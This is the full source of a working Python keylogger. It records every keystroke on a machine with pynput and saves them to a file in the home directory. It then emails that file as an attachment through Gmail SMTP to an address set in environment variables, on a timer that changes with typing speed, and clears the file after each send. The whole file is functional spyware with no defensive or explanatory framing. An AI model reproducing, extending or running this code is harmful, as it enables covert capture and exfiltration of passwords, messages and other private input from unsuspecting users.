import smtplib
import time
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener
import threading
from dotenv import load_dotenv

load_dotenv()

email_address = os.getenv("EMAIL_ADDRESS")
password = os.getenv("EMAIL_PASSWORD")
toaddr = os.getenv("TOADDR")

if not all([email_address, password, toaddr]):
    print("Error: Email credentials are missing.")
    exit()

keys_information = "key_log.txt"
file_path = os.path.expanduser("~")
full_path = os.path.join(file_path, keys_information)

keys = []
keystroke_times = []
lock = threading.Lock()

normal_mode_interval = 30  # 30 seconds
fast_mode_interval = 900  # 15 minutes
fast_typing_threshold = 40  # 40 seconds
fast_typing_keystroke_count = 100
fast_typing_mode = False
last_email_time = time.time()
last_keystroke_time = None


def write_to_file():
    """Writes logged keys to file without clearing buffer immediately."""
    with open(full_path, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write(" ")
            elif k == "Key.enter":
                f.write("\n")
            elif k == "Key.backspace":
                f.write("[BACKSPACE]")
            elif "Key" not in k:
                f.write(k)
    keys.clear()


def send_email():
    global last_email_time, fast_typing_mode, keystroke_times

    with lock:
        if not os.path.exists(full_path) or os.path.getsize(full_path) == 0:
            return  # Don't send email if file is empty

    try:
        msg = MIMEMultipart()
        msg['From'] = email_address
        msg['To'] = toaddr
        msg['Subject'] = "New Key Logs"
        msg.attach(MIMEText("Attached is the latest keystroke data.", 'plain'))

        with open(full_path, 'rb') as attach_file:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attach_file.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename={keys_information}")
            msg.attach(p)

        with smtplib.SMTP('smtp.gmail.com', 587) as s:
            s.starttls()
            s.login(email_address, password)
            s.sendmail(email_address, toaddr, msg.as_string())

        last_email_time = time.time()
        fast_typing_mode = False  # Reset fast mode after email is sent
        keystroke_times.clear()

        open(full_path, "w").close()  # Clear file after successful email

    except Exception as e:
        print(f"Failed to send email: {e}")


def on_press(key):
    global keys, fast_typing_mode, keystroke_times, last_keystroke_time

    with lock:
        keys.append(key)
        current_time = time.time()
        keystroke_times.append(current_time)

        if len(keystroke_times) > fast_typing_keystroke_count:
            keystroke_times.pop(0)

        if last_keystroke_time is None:
            last_keystroke_time = current_time  # Start timer when first keystroke is written

    if not fast_typing_mode and len(keystroke_times) >= fast_typing_keystroke_count and \
            (keystroke_times[-1] - keystroke_times[0]) <= fast_typing_threshold:
        fast_typing_mode = True  # Enable fast mode


def email_scheduler():
    global last_email_time, last_keystroke_time
    while True:
        time.sleep(1)
        current_time = time.time()

        if last_keystroke_time is None:
            continue  # Don't start counting until the first keystroke after an email

        if fast_typing_mode and (current_time - last_email_time) >= fast_mode_interval:
            write_to_file()
            send_email()
        elif not fast_typing_mode and (current_time - last_keystroke_time) >= normal_mode_interval:
            write_to_file()
            send_email()
            last_keystroke_time = None  # Reset the timer after email is sent


email_thread = threading.Thread(target=email_scheduler, daemon=True)
email_thread.start()

with Listener(on_press=on_press) as listener:
    listener.join()
